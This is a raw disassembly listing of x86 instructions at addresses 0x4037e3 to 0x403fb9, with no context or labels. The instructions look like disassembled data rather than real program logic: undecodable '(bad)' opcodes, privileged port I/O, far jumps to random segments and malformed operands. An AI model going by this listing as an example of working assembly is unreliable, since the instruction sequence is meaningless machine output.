  4037e3:	or     al,BYTE PTR es:[edx-0x17]
  4037e7:	inc    edx
  4037e8:	mov    eax,ds:0x1d8d8286
  4037ed:	ins    DWORD PTR es:[edi],dx
  4037ee:	mov    al,ds:0x20a14c0
  4037f3:	inc    edi
  4037f4:	pop    esi
  4037f5:	add    DWORD PTR [ebx-0x7c7ca1b9],0x42
  4037fc:	cmp    edi,0xf9ca12e0
  403802:	pusha  
  403803:	lock sti 
  403805:	mov    ch,0xd4
  403807:	stos   BYTE PTR es:[edi],al
  403808:	shl    BYTE PTR [ecx-0x3221cc5a],cl
  40380e:	pop    ds
  40380f:	ins    BYTE PTR es:[edi],dx
  403810:	mov    ebx,0x2cc54cc1
  403815:	(bad)  
  403817:	push   cs
  403818:	mov    esp,0x52d8b61d
  40381d:	call   0xc0b19dc3
  403822:	jne    0x4037ec
  403824:	or     eax,0x771002d0
  403829:	(bad)  
  40382a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40382b:	test   eax,0xc6a5c2a9
  403830:	test   eax,0xb1a2d24b
  403835:	or     DWORD PTR [edx],0x619c921f
  40383b:	jle    0x403854
  40383d:	sbb    edx,esi
  40383f:	test   al,0xfc
  403841:	push   ds
  403842:	inc    esp
  403843:	or     edi,eax
  403845:	retf   0x885e
  403848:	pop    edx
  403849:	jae    0x403871
  40384b:	and    al,0xd0
  40384d:	and    eax,0xdf8ad1fc
  403852:	fisttp WORD PTR [edx-0x43]
  403855:	bound  esp,QWORD PTR [eax]
  403857:	adc    al,0x7b
  403859:	cmp    al,0x15
  40385b:	sbb    al,0x1a
  40385d:	jae    0x4037e7
  40385f:	xor    esp,0x32b1b197
  403865:	cld    
  403866:	hlt    
  403867:	inc    edi
  403868:	cmp    eax,0x3e7e07b5
  40386d:	call   0x3b60:0x71be151b
  403874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403875:	mov    al,0x7e
  403877:	sbb    BYTE PTR [edi-0x58],bl
  40387a:	pop    ebx
  40387b:	loopne 0x40381f
  40387d:	in     al,0x9f
  40387f:	int3   
  403880:	fldcw  WORD PTR [esi-0xa7d48d0]
  403886:	call   FWORD PTR [ebp-0x11]
  403889:	and    BYTE PTR [ebp-0x46],dh
  40388c:	fninit 
  40388e:	aaa    
  40388f:	or     DWORD PTR [esi],ebx
  403891:	fist   DWORD PTR [eax-0x418fdae8]
  403897:	cmp    al,0x99
  403899:	loope  0x403857
  40389b:	int    0x20
  40389d:	sub    al,0xdf
  40389f:	xor    al,0xbf
  4038a1:	jge    0x4038de
  4038a3:	jae    0x4038b6
  4038a5:	and    ebp,DWORD PTR [ebx+eiz*2]
  4038a8:	shl    BYTE PTR [edi],1
  4038aa:	sbb    eax,0x9fdae2b
  4038af:	push   ebx
  4038b0:	adc    BYTE PTR [ebp-0x7368b24],al
  4038b6:	loopne 0x403882
  4038b8:	inc    esp
  4038b9:	jns    0x4038c0
  4038bb:	or     al,0x86
  4038bd:	arpl   WORD PTR [ebp-0x7579cd0c],sp
  4038c3:	dec    esp
  4038c4:	sbb    DWORD PTR [edi+0x3e],edi
  4038c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038c8:	ds push ebp
  4038ca:	sbb    BYTE PTR [ecx-0x78],ah
  4038cd:	into   
  4038ce:	push   cs
  4038cf:	xor    BYTE PTR [eax-0x7babdb07],al
  4038d5:	ins    BYTE PTR es:[edi],dx
  4038d6:	and    eax,0xc7c9c4ed
  4038db:	add    ah,BYTE PTR [esi*4+0x3602d529]
  4038e2:	fisub  WORD PTR [eax]
  4038e4:	sbb    ecx,DWORD PTR [eax+0x50ef37aa]
  4038ea:	cdq    
  4038eb:	ins    DWORD PTR es:[edi],dx
  4038ec:	xchg   edi,eax
  4038ed:	sbb    al,0x2b
  4038ef:	scas   eax,DWORD PTR es:[edi]
  4038f0:	sbb    cl,ch
  4038f2:	sbb    ah,dh
  4038f4:	or     BYTE PTR [ebx],0xa0
  4038f7:	fisub  DWORD PTR [esi]
  4038f9:	dec    eax
  4038fa:	pusha  
  4038fb:	xor    BYTE PTR [ecx],dl
  4038fd:	adc    al,0x8
  4038ff:	lods   eax,DWORD PTR ds:[esi]
  403900:	int3   
  403901:	and    BYTE PTR [eax+0x7c],bl
  403904:	test   eax,0x60178adc
  403909:	jle    0x40394b
  40390b:	inc    ebp
  40390c:	sub    ch,dh
  40390e:	loopne 0x40392a
  403910:	sbb    DWORD PTR [edx+eiz*2],ebx
  403913:	push   ebx
  403914:	sub    eax,0x84bd3930
  403919:	pop    ss
  40391a:	xor    al,0x58
  40391c:	out    0xb6,eax
  40391e:	mov    edx,0x8bbd3695
  403923:	sbb    bh,dl
  403925:	pop    eax
  403926:	inc    ebx
  403927:	add    DWORD PTR [edx+esi*8-0x6aea03cf],ebp
  40392e:	push   eax
  40392f:	xchg   ecx,eax
  403930:	jno    0x403944
  403932:	sbb    esi,DWORD PTR [edi+0x6458e028]
  403938:	sahf   
  403939:	int3   
  40393a:	ss mov bl,0x94
  40393d:	add    al,0xd
  40393f:	sub    eax,DWORD PTR [edx+0x65]
  403942:	adc    bh,ch
  403944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403945:	ret    
  403946:	xchg   ecx,eax
  403947:	add    eax,0x6d6cbb3c
  40394c:	pop    eax
  40394d:	sbb    DWORD PTR [eax],0xc2b93440
  403953:	inc    esi
  403954:	lds    esi,FWORD PTR [esp+edx*8-0x48]
  403958:	mov    cl,0xe0
  40395a:	push   eax
  40395b:	test   al,0xf8
  40395d:	xchg   ebx,eax
  40395e:	fs push 0x86e22d9a
  403964:	sbb    eax,0xabf51eda
  403969:	popa   
  40396a:	out    dx,al
  40396b:	xchg   ebp,eax
  40396c:	div    BYTE PTR [eax]
  40396e:	dec    edi
  40396f:	jge    0x403967
  403971:	ins    BYTE PTR es:[edi],dx
  403972:	stos   DWORD PTR es:[edi],eax
  403973:	jp     0x403914
  403975:	sar    BYTE PTR [ecx],0x4a
  403978:	push   edx
  403979:	inc    ebx
  40397a:	cwde   
  40397b:	jp     0x403942
  40397d:	enter  0x2e24,0xd8
  403981:	dec    edx
  403982:	jbe    0x4039c1
  403984:	les    esi,FWORD PTR [esi+edx*8+0x238f78ad]
  40398b:	in     al,0xee
  40398d:	retf   0xff72
  403990:	xchg   edi,eax
  403991:	dec    ebp
  403992:	sub    BYTE PTR [eax],cl
  403994:	xor    esi,DWORD PTR [edx+0x5aba6dbc]
  40399a:	data16 jnp 0x4039b1
  40399d:	dec    ecx
  40399e:	lods   eax,DWORD PTR ds:[esi]
  40399f:	mov    esi,0x7fec524f
  4039a4:	pop    edi
  4039a5:	fwait
  4039a6:	fs loop 0x40399d
  4039a9:	retf   
  4039aa:	mov    ds:0xab6f97aa,al
  4039af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039b0:	pop    edx
  4039b1:	mov    ah,0xd9
  4039b3:	push   ss
  4039b4:	inc    ebx
  4039b5:	sbb    ecx,DWORD PTR [edi+0x293ebbd5]
  4039bb:	add    al,cl
  4039bd:	push   0xfffffff2
  4039bf:	mov    ecx,edx
  4039c1:	jmp    0xc798:0x51c3978b
  4039c8:	outs   dx,DWORD PTR ds:[esi]
  4039c9:	stos   DWORD PTR es:[edi],eax
  4039ca:	inc    eax
  4039cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039cc:	add    ch,BYTE PTR [ecx-0x74cf9116]
  4039d2:	mov    ebp,0x63271aad
  4039d7:	xor    eax,0x821c6593
  4039dc:	imul   ebx,DWORD PTR [edx],0xa8eb0541
  4039e2:	pop    ds
  4039e3:	not    DWORD PTR [esi+ecx*8+0x7]
  4039e7:	mov    ?,ecx
  4039e9:	mov    DWORD PTR [esi+ebp*4],eax
  4039ec:	jnp    0x4039d6
  4039ee:	mov    dh,BYTE PTR [eax+0x63]
  4039f1:	jne    0x403a13
  4039f3:	mov    DWORD PTR [edx-0x1d],esp
  4039f6:	jo     0x4039de
  4039f8:	mov    al,0x8a
  4039fa:	mov    al,ds:0x41b27191
  4039ff:	push   ebp
  403a00:	xchg   edi,eax
  403a01:	adc    bp,WORD PTR [esi-0x5df9be98]
  403a08:	call   0x4e4ee959
  403a0d:	or     bh,BYTE PTR [ebx]
  403a0f:	popf   
  403a10:	push   esi
  403a11:	jg     0x403a20
  403a13:	sub    al,0x3d
  403a15:	and    ebx,DWORD PTR ds:0x3fb113c1
  403a1b:	je     0x403a41
  403a1d:	pop    es
  403a1e:	lds    ecx,FWORD PTR [eax]
  403a20:	pop    ds
  403a21:	(bad)  
  403a22:	outs   dx,BYTE PTR ds:[esi]
  403a23:	arpl   WORD PTR [ebp-0x41],bp
  403a26:	and    eax,0x5d3c6e0d
  403a2b:	pusha  
  403a2c:	jg     0x403a63
  403a2e:	fdivr  DWORD PTR [esi+0x4cd12355]
  403a34:	icebp  
  403a35:	mov    ebx,0x1bebbed9
  403a3a:	(bad)  
  403a3d:	pop    ds
  403a3e:	pop    es
  403a3f:	pop    ds
  403a40:	neg    BYTE PTR [ebp+0xf]
  403a43:	std    
  403a44:	call   0x1fa4:0xdeeb174a
  403a4b:	ret    0xac95
  403a4e:	dec    esi
  403a4f:	or     DWORD PTR [edi-0x3c93bc50],ebx
  403a55:	ins    DWORD PTR es:[edi],dx
  403a56:	test   al,0x97
  403a58:	mov    dh,dh
  403a5a:	cmc    
  403a5b:	imul   esp,edx,0x34
  403a5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a5f:	in     al,dx
  403a60:	rcl    BYTE PTR [edi+edi*4],cl
  403a63:	ja     0x403ac7
  403a65:	push   ss
  403a66:	cli    
  403a67:	xlat   BYTE PTR ds:[ebx]
  403a68:	ret    
  403a69:	jo     0x403a74
  403a6b:	xor    cl,dl
  403a6d:	stos   BYTE PTR es:[edi],al
  403a6e:	push   0x43
  403a70:	and    al,0x41
  403a72:	and    eax,0x49466b05
  403a77:	fs out 0x0,al
  403a7a:	xchg   cl,al
  403a7c:	je     0x403a2a
  403a7e:	pushf  
  403a7f:	sbb    esi,DWORD PTR [edx]
  403a81:	pusha  
  403a82:	dec    ebp
  403a83:	mov    ebp,0x6d99b2ae
  403a88:	mov    ebx,DWORD PTR [edx+eax*8+0x2d]
  403a8c:	and    eax,0xc209c77a
  403a91:	push   cs
  403a92:	call   0xafdc79ef
  403a97:	mov    ds:0x53631a66,eax
  403a9c:	int3   
  403a9d:	sbb    DWORD PTR [ebx-0x76],eax
  403aa0:	je     0x403ad9
  403aa2:	dec    edx
  403aa3:	mov    eax,ecx
  403aa5:	cmp    ebx,DWORD PTR [ecx]
  403aa7:	lods   al,BYTE PTR ds:[esi]
  403aa8:	sub    edx,eax
  403aaa:	jns    0x403aac
  403aac:	out    0x2f,eax
  403aae:	retf   
  403aaf:	pop    esi
  403ab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ab1:	fimul  DWORD PTR [esi+0x1b]
  403ab4:	and    al,0x2f
  403ab6:	test   al,0xba
  403ab8:	outs   dx,BYTE PTR ds:[esi]
  403ab9:	out    0xad,eax
  403abb:	xchg   esi,eax
  403abc:	pop    ecx
  403abd:	pop    esi
  403abe:	or     WORD PTR [edi],0xc3c9
  403ac3:	cmc    
  403ac4:	outs   dx,DWORD PTR ds:[esi]
  403ac5:	add    BYTE PTR [esi-0x4aa42612],dh
  403acb:	and    esi,DWORD PTR [ecx+edi*8-0x710ab248]
  403ad2:	jle    0x403a7c
  403ad4:	jmp    0x7ec1394d
  403ad9:	add    BYTE PTR [edi],ch
  403adb:	retf   0xbb
  403ade:	push   ds
  403adf:	addr16 das 
  403ae1:	add    DWORD PTR [esi+esi*2-0x69],esi
  403ae5:	lea    eax,[esi]
  403ae7:	std    
  403ae8:	dec    edi
  403ae9:	jmp    0x3935:0x9b9fce06
  403af0:	jns    0x403aeb
  403af2:	xlat   BYTE PTR ds:[ebx]
  403af3:	pop    ecx
  403af4:	and    BYTE PTR [eax],cl
  403af6:	inc    edi
  403af7:	push   esp
  403af8:	lods   al,BYTE PTR ds:[esi]
  403af9:	aaa    
  403afa:	push   es
  403afb:	pusha  
  403afc:	pop    esi
  403afd:	cmp    DWORD PTR [edi+0x317af8f0],edx
  403b03:	ss pop eax
  403b05:	sti    
  403b06:	test   al,0xc4
  403b08:	dec    esp
  403b09:	dec    ebp
  403b0a:	imul   esi,DWORD PTR [eax-0x75],0xbf8389ac
  403b11:	cmp    ecx,ecx
  403b13:	jno    0x403b09
  403b15:	xlat   BYTE PTR ds:[ebx]
  403b16:	scas   al,BYTE PTR es:[edi]
  403b17:	mov    ds:0xc0e24dc0,al
  403b1c:	and    DWORD PTR [esi+edi*4],0x42
  403b20:	outs   dx,DWORD PTR ds:[esi]
  403b21:	mov    ch,0x1a
  403b23:	jnp    0x403aae
  403b25:	popa   
  403b26:	jne    0x403b5b
  403b28:	pop    ss
  403b29:	pop    es
  403b2a:	xchg   ebp,eax
  403b2b:	or     al,BYTE PTR [ebp-0x47]
  403b2e:	or     bh,BYTE PTR [eax-0x2fdbe606]
  403b34:	inc    esi
  403b35:	mov    ch,0xc5
  403b37:	les    eax,FWORD PTR [ecx-0x5f]
  403b3a:	mov    ah,0xa6
  403b3c:	jmp    0xac9f076b
  403b41:	sbb    ah,dh
  403b43:	mov    ebx,0x821a538d
  403b48:	pop    ds
  403b49:	add    bl,ah
  403b4b:	bound  esp,QWORD PTR [edx+0x4]
  403b4e:	into   
  403b4f:	pop    es
  403b50:	fcom   DWORD PTR [ebp+0x42b3bd5f]
  403b56:	test   DWORD PTR [edx+0x39516cf9],edi
  403b5c:	imul   ebx,edi,0xcbcb9a12
  403b62:	retf   
  403b63:	test   al,0xc5
  403b65:	push   ds
  403b66:	dec    edi
  403b67:	imul   esp,ecx,0x9cb9cbe1
  403b6d:	cwde   
  403b6e:	push   0x1fecaea8
  403b73:	aad    0x82
  403b75:	in     eax,dx
  403b76:	inc    esp
  403b77:	(bad)  
  403b78:	and    ch,al
  403b7a:	retf   
  403b7b:	call   0x6fbd:0xb2288846
  403b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b83:	jmp    0x37909b77
  403b88:	and    ah,BYTE PTR [edx-0x99c1a1]
  403b8e:	cmp    eax,0xbfed2e43
  403b93:	mov    edx,DWORD PTR [ebx+0x11]
  403b96:	jnp    0x403b61
  403b98:	adc    ah,BYTE PTR [ebx+0x6b]
  403b9b:	arpl   WORD PTR [ebx+ebx*1],cx
  403b9e:	lds    esp,FWORD PTR [edx+eax*4+0x76]
  403ba2:	ret    
  403ba3:	je     0x403c02
  403ba5:	out    dx,al
  403ba6:	out    dx,al
  403ba7:	scas   eax,DWORD PTR es:[edi]
  403ba8:	ror    BYTE PTR [ecx-0x5a],1
  403bab:	iret   
  403bac:	scas   al,BYTE PTR es:[edi]
  403bad:	test   eax,0xadfcb106
  403bb2:	cmc    
  403bb3:	stos   DWORD PTR es:[edi],eax
  403bb4:	mov    ds:0xfe74d6c9,al
  403bb9:	and    BYTE PTR [esi-0x69],cl
  403bbc:	fnstcw WORD PTR [esi+0x25]
  403bbf:	jmp    0x923c:0xb56db908
  403bc6:	addr16 pop ebp
  403bc8:	adc    eax,0x26852437
  403bcd:	mov    ebp,DWORD PTR [esi-0x45517040]
  403bd3:	push   esi
  403bd4:	cmp    al,0xbc
  403bd6:	sub    al,0xcb
  403bd8:	out    0x49,eax
  403bda:	arpl   dx,si
  403bdc:	test   eax,0x4af3dbc7
  403be1:	fcomp  DWORD PTR [ecx-0x54]
  403be4:	ror    DWORD PTR [ebp-0x62],1
  403be7:	xchg   ebp,eax
  403be8:	repnz lods al,BYTE PTR ds:[esi]
  403bea:	lods   eax,DWORD PTR ds:[esi]
  403beb:	mov    esp,0x6f4cd155
  403bf0:	jg     0x403bbb
  403bf2:	adc    DWORD PTR [edx+0x2ee6fc27],ecx
  403bf8:	imul   ecx,ebp,0xdccce337
  403bfe:	(bad)  
  403c00:	push   ss
  403c01:	jae    0x403ba3
  403c03:	std    
  403c04:	push   edi
  403c05:	mov    cl,0x32
  403c07:	mov    eax,0xbeaf195d
  403c0c:	das    
  403c0d:	mov    esi,DWORD PTR [edx+0x5a]
  403c10:	std    
  403c11:	dec    eax
  403c12:	ror    DWORD PTR [edx+0x272ae8d3],cl
  403c18:	es mov dh,0x23
  403c1b:	cwde   
  403c1c:	and    dh,ch
  403c1e:	jl     0x403bce
  403c20:	mov    edx,0x812871cf
  403c25:	int3   
  403c26:	and    DWORD PTR [ecx-0x68],0x46df0ff2
  403c2d:	xchg   esi,eax
  403c2e:	cmp    DWORD PTR [ebp+ecx*1-0x52ad51b7],esp
  403c35:	std    
  403c36:	push   0x4ecfcc46
  403c3b:	ret    
  403c3c:	sub    eax,0x201a8c22
  403c41:	popf   
  403c42:	lods   eax,DWORD PTR ds:[esi]
  403c43:	fistp  QWORD PTR [esi]
  403c45:	mov    edx,0xf3d49db7
  403c4a:	xor    ecx,0x40
  403c4d:	and    cl,BYTE PTR [edi+0x540a7577]
  403c53:	mov    ebp,0x7458a05a
  403c58:	sahf   
  403c59:	call   0xd93c:0x4b9d1b68
  403c60:	stos   DWORD PTR es:[edi],eax
  403c61:	jnp    0x403be6
  403c63:	leave  
  403c64:	mov    edi,0x4fbf6649
  403c69:	or     al,0x53
  403c6b:	mov    DWORD PTR [ebx+0x7b],esi
  403c6e:	inc    eax
  403c6f:	lahf   
  403c70:	mov    ah,0xe7
  403c72:	pushf  
  403c73:	cmc    
  403c74:	mov    cl,0xa
  403c76:	call   0x90a916f9
  403c7b:	je     0x403c08
  403c7d:	ins    DWORD PTR es:[edi],dx
  403c7e:	js     0x403c7a
  403c80:	in     al,0x50
  403c82:	in     eax,dx
  403c83:	or     edi,DWORD PTR [ebp+esi*2-0x6d628181]
  403c8a:	push   ecx
  403c8b:	mov    WORD PTR [ebx],ds
  403c8d:	loop   0x403c4f
  403c8f:	lahf   
  403c90:	add    eax,0xd9f7b6d4
  403c95:	aad    0xd
  403c97:	push   cs
  403c98:	sub    eax,0x65962efd
  403c9d:	sub    DWORD PTR [ebx],ebp
  403c9f:	pop    eax
  403ca0:	(bad)  
  403ca1:	mov    esp,0x76e81b61
  403ca6:	cmova  ebx,DWORD PTR [edx]
  403ca9:	jae    0x403cc6
  403cab:	bound  edi,QWORD PTR [ebp+0x19a74c3]
  403cb1:	mov    edx,0x1cfd5e51
  403cb6:	jp     0x403c6a
  403cb8:	add    BYTE PTR [esi],dh
  403cba:	in     eax,dx
  403cbb:	pop    ds
  403cbc:	mov    al,ds:0x88c157f
  403cc1:	sbb    BYTE PTR [eax+0x5a9e27e0],ch
  403cc7:	scas   al,BYTE PTR es:[edi]
  403cc8:	ds or  al,0x2
  403ccb:	call   0x5a45:0xc8fc916f
  403cd2:	dec    ebp
  403cd3:	xchg   BYTE PTR [ecx+0x6d],cl
  403cd6:	sub    al,0xc7
  403cd8:	jo     0x403cce
  403cda:	mov    dh,0x6d
  403cdc:	test   DWORD PTR [ecx+0x67],ebp
  403cdf:	inc    ebx
  403ce0:	(bad)  
  403ce1:	push   ecx
  403ce2:	cmp    dl,BYTE PTR [ebx+0xdfc6485]
  403ce8:	pop    esp
  403ce9:	retf   
  403cea:	jno    0x403cb9
  403cec:	pop    es
  403ced:	jecxz  0x403d34
  403cef:	xchg   esi,eax
  403cf0:	mov    al,0x1c
  403cf2:	or     DWORD PTR [eax-0x2761325a],eax
  403cf8:	sub    DWORD PTR [eax],edi
  403cfa:	push   0xffffffbb
  403cfc:	mov    ebx,0xc8c50544
  403d01:	fisttp DWORD PTR [bp+si-0x3d05]
  403d06:	push   0xffffff83
  403d08:	rcl    ah,0x53
  403d0b:	imul   edi,ebx,0x5
  403d0e:	call   0x9bfb:0x5bfb6b71
  403d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d17:	shl    ebp,1
  403d19:	mov    ch,0xc5
  403d1b:	cmp    eax,0x61f2eb64
  403d20:	jb     0x403d7e
  403d22:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  403d24:	mov    ds:0x4431a8f,al
  403d29:	xchg   DWORD PTR [edi-0x4410cd9],esp
  403d2f:	cmp    al,BYTE PTR [ebx+0x58]
  403d32:	sub    eax,0xf711437a
  403d37:	ror    DWORD PTR [ebp+0x5ba6fd8f],0xbd
  403d3e:	mov    ds:0x280c772,al
  403d43:	mov    ecx,0x48f6dfdc
  403d48:	inc    eax
  403d49:	imul   edx,DWORD PTR [edi-0x5f8ae764],0xffffff88
  403d50:	lahf   
  403d51:	xlat   BYTE PTR ds:[ebx]
  403d52:	int3   
  403d53:	jp     0x403d83
  403d55:	pusha  
  403d56:	inc    esi
  403d57:	inc    ecx
  403d58:	adc    ch,BYTE PTR [edi-0x73]
  403d5b:	push   0x1f
  403d5d:	jle    0x403d52
  403d5f:	ds pop ebx
  403d61:	ret    
  403d62:	xor    eax,0xb9d18c62
  403d67:	and    eax,0x1af0ebc5
  403d6c:	jo     0x403d37
  403d6e:	dec    ecx
  403d6f:	xor    al,0x58
  403d71:	shl    DWORD PTR [ebx],cl
  403d73:	mov    ch,0x65
  403d75:	cs loope 0x403d40
  403d78:	lea    ebx,[edi]
  403d7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d7b:	lock xchg ebx,eax
  403d7d:	rcl    ch,1
  403d7f:	jae    0x403d0c
  403d81:	arpl   sp,di
  403d83:	add    ah,BYTE PTR [ebp-0x35530ee0]
  403d89:	cmp    eax,0x1570484e
  403d8e:	rcl    BYTE PTR [ecx+eax*4],cl
  403d91:	ins    DWORD PTR es:[edi],dx
  403d92:	mov    ecx,0xf450470a
  403d97:	outs   dx,BYTE PTR ds:[esi]
  403d98:	aaa    
  403d99:	mov    bh,0x8f
  403d9b:	dec    esp
  403d9c:	popa   
  403d9d:	cld    
  403d9e:	mov    ebx,0x63026498
  403da3:	ror    DWORD PTR es:[edx],cl
  403da6:	pop    edx
  403da7:	xchg   ecx,eax
  403da8:	add    eax,0x5c873668
  403dad:	sub    al,0xa1
  403daf:	inc    edx
  403db0:	and    ecx,esi
  403db2:	sub    DWORD PTR [ebp+edx*2+0x0],edi
  403db6:	add    BYTE PTR [edx+edx*8+0x0],cl
  403dba:	adc    DWORD PTR [esi+esi*8-0x33],0xb55f7102
  403dc2:	sti    
  403dc3:	and    al,al
  403dc5:	sbb    dl,BYTE PTR [edx+0x43]
  403dc8:	or     dl,BYTE PTR [edx]
  403dca:	mov    al,0xa5
  403dcc:	xchg   esp,eax
  403dcd:	mov    al,ds:0x9c311545
  403dd2:	or     al,BYTE PTR [ebx-0x5c7b1659]
  403dd8:	mov    bl,0x26
  403dda:	in     eax,dx
  403ddb:	sub    BYTE PTR [ebx+0x5],cl
  403dde:	rol    esi,0x14
  403de1:	lods   al,BYTE PTR ds:[esi]
  403de2:	or     bl,BYTE PTR [ebx-0x78]
  403de5:	fucomip st,st(2)
  403de7:	mov    edx,0xa36600c8
  403dec:	shl    DWORD PTR [ebp-0x4f268bcc],0xe0
  403df3:	retf   0xb743
  403df6:	ss cdq 
  403df8:	pop    ebp
  403df9:	push   esp
  403dfa:	int3   
  403dfb:	sub    DWORD PTR [edx],esi
  403dfd:	pushf  
  403dfe:	fs daa 
  403e00:	push   edx
  403e01:	mov    esi,ds
  403e03:	xchg   ebx,eax
  403e04:	in     eax,0xc8
  403e06:	add    eax,esi
  403e08:	cmp    al,0x12
  403e0a:	jne    0x403e74
  403e0c:	cmp    BYTE PTR [edi-0xd80ae06],ah
  403e12:	lods   al,BYTE PTR ds:[esi]
  403e13:	lea    ebx,[ebx-0x75476947]
  403e19:	sbb    ebx,DWORD PTR [edx]
  403e1b:	inc    edx
  403e1c:	mov    bl,bl
  403e1e:	dec    eax
  403e1f:	(bad)  
  403e20:	out    0xee,eax
  403e22:	cld    
  403e23:	in     al,dx
  403e24:	pop    ebx
  403e25:	fs push eax
  403e27:	das    
  403e28:	icebp  
  403e29:	pop    es
  403e2a:	fidiv  DWORD PTR [esi+ecx*1+0x70364c4d]
  403e31:	dec    esi
  403e32:	xchg   esi,eax
  403e33:	std    
  403e34:	dec    ebx
  403e35:	ror    DWORD PTR [ebx+0x1cb6af33],cl
  403e3b:	(bad)  
  403e3c:	jbe    0x403e46
  403e3e:	js     0x403ebc
  403e40:	idiv   DWORD PTR [esi-0x58d89ce7]
  403e46:	add    bl,dl
  403e48:	or     DWORD PTR [edx-0x77],eax
  403e4b:	cmp    edx,DWORD PTR [esi-0x7d]
  403e4e:	dec    esi
  403e4f:	test   eax,0x65e64f37
  403e54:	ins    DWORD PTR es:[edi],dx
  403e55:	dec    esp
  403e56:	xchg   edx,eax
  403e57:	or     ah,bh
  403e59:	ret    
  403e5a:	mov    eax,0xd35bfc22
  403e5f:	and    al,0x5
  403e61:	sbb    dl,cl
  403e63:	into   
  403e64:	sbb    WORD PTR [ecx-0x5fb23bff],bp
  403e6b:	pushf  
  403e6c:	imul   ebx,DWORD PTR [ecx+0x2203daf3],0xffffff9b
  403e73:	shl    DWORD PTR [ebp-0x36da1960],1
  403e79:	add    ebx,0xceb6ccb
  403e7f:	pop    ss
  403e80:	int    0x7f
  403e82:	cmp    eax,DWORD PTR [ebx+0x34]
  403e85:	jmp    0x3030:0x4ecdb4ca
  403e8c:	arpl   WORD PTR [edx],bp
  403e8e:	cld    
  403e8f:	cwde   
  403e90:	push   edx
  403e91:	in     eax,0xf0
  403e93:	imul   ebp,DWORD PTR [ebx+edx*1],0x1aa77e19
  403e9a:	mov    dl,BYTE PTR [edi-0x15]
  403e9d:	xor    al,BYTE PTR [eax+0x129cd7d]
  403ea3:	adc    ch,BYTE PTR cs:[edi]
  403ea6:	call   0x5104ebae
  403eab:	sbb    BYTE PTR [edi+0x74],0xa3
  403eaf:	inc    ebp
  403eb0:	repz loopne 0x403e93
  403eb3:	and    esp,0x639e04e4
  403eb9:	inc    edi
  403eba:	mov    esp,0x45df216e
  403ebf:	and    dh,BYTE PTR [esi-0x76f80ffe]
  403ec5:	adc    DWORD PTR [ebp+0x26],0xe56f0a49
  403ecc:	jge    0x403e55
  403ece:	xchg   esp,eax
  403ecf:	push   ebx
  403ed0:	cmp    dl,al
  403ed2:	adc    ah,BYTE PTR [ebx+eax*1+0xe]
  403ed6:	rcl    DWORD PTR [esi-0x3de6d970],cl
  403edc:	fs shr bh,1
  403edf:	or     DWORD PTR [esi],ebp
  403ee1:	pop    eax
  403ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ee3:	sahf   
  403ee4:	jp     0x403ec4
  403ee6:	add    DWORD PTR [ebp+0x7d],ebp
  403ee9:	mov    cl,0x4f
  403eeb:	test   eax,0x3cf21b13
  403ef0:	mov    eax,0x45ac58e4
  403ef5:	mov    dl,0x99
  403ef7:	out    0x87,al
  403ef9:	jl     0x403f14
  403efb:	xchg   ecx,eax
  403efc:	xchg   esi,eax
  403efd:	addr16 jle 0x403f11
  403f00:	aaa    
  403f01:	xchg   edx,eax
  403f02:	in     eax,dx
  403f03:	mov    esi,0xff321810
  403f08:	sar    BYTE PTR [ebp+0x3aca5df8],0x80
  403f0f:	add    eax,0xcb06eafd
  403f14:	mov    edx,0xf30ba79b
  403f19:	add    ebx,esi
  403f1b:	dec    esp
  403f1c:	punpckldq mm5,DWORD PTR [edx-0x4d410a5a]
  403f23:	jge    0x403ee4
  403f25:	aas    
  403f26:	add    DWORD PTR [ebx+0x25],ecx
  403f29:	loope  0x403ee4
  403f2b:	mov    edi,0x8ce33685
  403f30:	and    DWORD PTR [ebx],eax
  403f32:	gs sar ah,0xae
  403f36:	fwait
  403f37:	sbb    esi,ecx
  403f39:	sub    ecx,esp
  403f3b:	mov    esi,0xcd75064
  403f40:	lahf   
  403f41:	add    dl,cl
  403f43:	call   0x9c113e02
  403f48:	jmp    0xf29e7c26
  403f4d:	ret    
  403f4e:	jnp    0x403fcd
  403f50:	jmp    0x5919:0x95b70509
  403f57:	adc    ebx,DWORD PTR [ecx-0x664395e1]
  403f5d:	xchg   esi,eax
  403f5e:	push   esp
  403f5f:	cld    
  403f60:	js     0x403f36
  403f62:	in     al,dx
  403f63:	call   0xf4e2:0xb9d6827e
  403f6a:	daa    
  403f6b:	adc    bl,BYTE PTR [ebx]
  403f6d:	add    eax,0xa5719728
  403f72:	int    0x62
  403f74:	fwait
  403f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f76:	jp     0x403efc
  403f78:	jnp    0x403f77
  403f7a:	mov    WORD PTR [edi-0x1d],?
  403f7d:	xchg   ecx,eax
  403f7e:	bound  esp,QWORD PTR ds:0xc28d8bc
  403f84:	xchg   esi,eax
  403f85:	xor    al,0x7a
  403f87:	dec    esp
  403f88:	ins    DWORD PTR es:[edi],dx
  403f89:	dec    esp
  403f8a:	sub    al,0x23
  403f8c:	mov    ch,0x43
  403f8e:	mov    esi,esi
  403f90:	mov    ebp,0x520290ce
  403f95:	xlat   BYTE PTR ds:[ebx]
  403f96:	pushf  
  403f97:	jae    0x403f33
  403f99:	push   ds
  403f9a:	or     DWORD PTR [edx+ecx*2],edx
  403f9d:	pusha  
  403f9e:	test   BYTE PTR [ebp-0x7f],0xff
  403fa2:	mov    al,ds:0x19c6943f
  403fa7:	xlat   BYTE PTR ds:[ebx]
  403fa8:	test   BYTE PTR [esi],0x36
  403fab:	test   eax,0xb291ee8c
  403fb0:	dec    esp
  403fb1:	ins    BYTE PTR es:[edi],dx
  403fb2:	(bad)  
  403fb4:	mov    esp,0xf0a30c34
  403fb9:	mov    eax,ds:0x5c385db1
